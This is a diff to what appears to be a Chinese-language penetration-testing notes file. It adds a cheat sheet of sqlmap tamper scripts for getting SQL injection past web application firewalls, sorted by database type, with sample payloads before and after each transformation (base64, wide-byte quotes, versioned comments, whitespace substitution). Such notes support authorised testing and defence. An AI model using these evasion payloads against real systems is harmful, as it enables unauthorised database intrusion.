@@ -165,20 +165,84 @@ https://github.com/pureqh/bypasswaf
 
 例子：
 
+- 详细：
+- https://www.cnblogs.com/lgf01010/p/9550725.html
+- https://blog.csdn.net/whatday/article/details/54774043
+
 ```
---tamper=xxx
-between                # 绕过>过滤
-unmagicquotes          # 宽字节注入
-e0UNION                # 将UNION替换成e0UNION
-apostrophemask         # 将'替换成UTF-8urlencoded的%EF%BC%87 
-apostrophenullencode   # 将'替换成%00%27
-appendnullbyte         # 在参数末尾加入%00
-base64encode           # base64编码所有字符
-between                # 将>字符替换为NOT BETWEEN 0 AND；将=字符替换为BETWEEN # AND # 
-charencode             # URL编码， 适用所有数据库
-chardoubleencode       # 二次URL编码
-charunicodeencode      # URL编码，必要条件:ASP,ASP.NET，适用所有数据库
-charunicodeescape      # url解码中的%篡改成\\
-commalesslimit         # 替换字符的位置
+--tamper=xxx    # 多个使用--tamper "xxx1,xxx2"
+常用：
+所有数据库：
+apostrophemask.py  # 用utf8代替引号，("1 AND '1'='1")替换后'1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
+base64encode.py    # 用base64编码替换，("1' AND SLEEP(5)#")替换后'MScgQU5EIFNMRUVQKDUpIw=='
+multiplespaces.py  #围绕SQL关键字添加多个空格，1 UNIONSELECTfoobar')替换后'1UNIONSELECTfoobar'
+space2plus.py      # 用+替换空格，('SELECTidFROMusers')替换后'SELECT+id+FROM+users'
+nonrecursivereplacement.py  # 双重查询语句，('1 UNION SELECT 2--')替换后'1 UNIOUNIONN SELESELECTCT 2--'
+space2randomblank.py # 代替空格字符（“”）从一个随机的空白字符可选字符的有效集,('SELECTidFROMusers')替换后'SELECT%0Did%0DFROM%0Ausers'
+unionalltounion.py# 替换UNION ALL SELECT UNION SELECT,('-1 UNION ALLSELECT')替换后'-1UNIONSELECT'
+securesphere.py   # 追加特制的字符串,('1 AND 1=1')替换后"1 AND 1=1 and '0having'='0having'"
+
+mysql:
+equaltolike.py# like 代替等号，SELECT*FROMusersWHEREid=1替换后SELECT*FROMusersWHEREidLIKE1
+greatest.py# 绕过过滤’>’ ,用GREATEST替换大于号。，('1 AND A > B')替换后'1 AND GREATEST(A,B+1)=A'
+apostrophenullencode.py# 绕过过滤双引号，替换字符和双引号，("1 AND '1'='1")替换后'1 AND %00%271%00%27=%00%271'
+ifnull2ifisnull.py# 绕过对 IFNULL 过滤，('IFNULL(1, 2)')替换后'IF(ISNULL(1),2,1)'
+space2mssqlhash.py# 替换空格，('1 AND 9227=9227')替换后'1%23%0AAND%23%0A9227=9227'
+modsecurityversioned.py# 过滤空格，包含完整的查询版本注释，('1 AND 2>1--')替换后'1 /*!30874AND 2>1*/--'
+space2mysqlblank.py# 空格替换其它空白符号(mysql)，SELECTidFROMusers替换后SELECT%0Bid%0BFROM%A0users
+between.py# 用between替换大于号（>），('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
+modsecurityzeroversioned.py# 包含了完整的查询与零版本注释，('1 AND 2>1--')替换后'1 /*!00000AND 2>1*/--'
+space2mysqldash.py# 替换空格字符（' '）（' – '）后跟一个破折号注释一个新行（' n'），('1 AND 9227=9227')替换后'1--%0AAND--%0A9227=9227'
+bluecoat.py# 代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like，
+percentage.py# asp允许每个字符前面添加一个%号
+charencode.p# url编码，
+randomcase.p# 随机大小写，INSERT替换后 InsERt
+versionedkeywords.p# 注释绕过，/*!xxx*/ 
+space2comment.p# 将空格替换为/**/，SELECT id FROM users替换后 SELECT/**/id/**/FROM/**/users
+charunicodeencode.p# 字符串 unicode 编码
+versionedmorekeywords.p# 注释绕过/*!xxx**!xx*/和/*!xxx*/，mysql小于5.1
+halfversionedmorekeywords.p# 当数据库为mysql时绕过防火墙，每个关键字之前添加/*!
+
+
+mssql：
+space2hash.py         # 绕过过滤=, 替换空格字符，后跟一个破折号注释，一个随机字符串和一个新行
+equaltolike.py        # like代替等号,SELECT*FROMusersWHEREid=1替换后SELECT*FROMusersWHEREidLIKE1
+space2mssqlblank.py   # 空格替换为其它空符号,SELECTidFROMusers替换后SELECT%08id%02FROM%0Fusers
+space2mssqlhash.py    # 替换空格,('1 AND 9227=9227')替换后'1%23%0AAND%23%0A9227=9227'
+between.py            # 将>字符替换为NOT BETWEEN 0 AND；将=字符替换为BETWEEN # AND # 
+percentage.py         # asp允许每个字符前面添加一个%号,SELECT * FROM TABLE替换后%S%E%L%E%C%T * %F%R%O%M %T%A%B%L%E
+sp_password.py        # 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾
+randomcase.py         # 随机大小写
+charencode.py         # 全部转成url编码
+charunicodeencode.py  # 全部转成unicode编码,必要条件:ASP,ASP.NET
+space2comment.py      # 将空格替换成/**/
+
+oracle：
+greatest.py # 绕过过滤’>’ ,用GREATEST替换大于号，('1 AND A > B')替换后'1 AND GREATEST(A,B+1)=A'
+apostrophenullencode.py #  绕过过滤双引号，双引号替换成字符（%00%27）或者单引号。
+between.py # 用between替换大于号（>），('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
+charencode.py # url编码
+randomcase.py # 随机大小写
+charunicodeencode.py # 字符串 unicode 编码
+space2comment.py # 将空格替换成/**/
+
+PostgreSQL：
+greatest.py # 绕过过滤’>’ ,用GREATEST替换大于号。
+apostrophenullencode.py # 绕过过滤双引号，双引号替换成字符（%00%27）或者单引号。
+between.py # 用between替换大于号（>）
+('1 AND A > B--')替换后'1 AND A NOT BETWEEN 0 AND B--'
+percentage.py # asp允许每个字符前面添加一个%号
+charencode.py # url编码
+randomcase.py # 随机大小写
+charunicodeencode.py # 字符串 unicode 编码
+space2comment.py # 将空格替换成/**/
+
+Microsoft Access数据库：
+appendnullbyte.py # 在有效负荷结束位置加载零字节字符编码，('1 AND 1=1')替换后'1 AND 1=1%00'
+
+其他数据库：
+chardoubleencode.py  # 双url编码(不处理已编码的)
+unmagicquotes.py  # 宽字符绕过 GPC  addslashes，1′ AND 1=1替换后1%bf%27 AND 1=1--
+randomcomments.py # 用/**/分割sql关键字，'INSERT'替换后'IN/**/S/**/ERT’
 ```
 
